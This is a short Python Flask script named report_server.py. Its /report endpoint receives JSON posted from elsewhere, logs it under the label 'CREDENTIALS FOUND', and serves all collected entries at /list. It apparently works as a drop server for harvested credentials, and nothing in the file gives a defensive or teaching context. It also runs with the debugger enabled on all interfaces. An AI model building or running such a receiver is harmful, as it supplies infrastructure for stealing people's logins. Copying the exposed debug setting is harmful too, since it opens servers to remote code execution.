# report_server.py
from flask import Flask, request, jsonify

app = Flask(__name__)

found = []

@app.route("/report", methods=["POST"])
def report():
    data = request.json
    found.append(data)
    print("CREDENTIALS FOUND:", data, flush = True)
    return "Ok\n"
    
@app.route("/list")
def list_all():
    return {"data": found}
    
app.run(host="0.0.0.0", port=5000, debug=True)


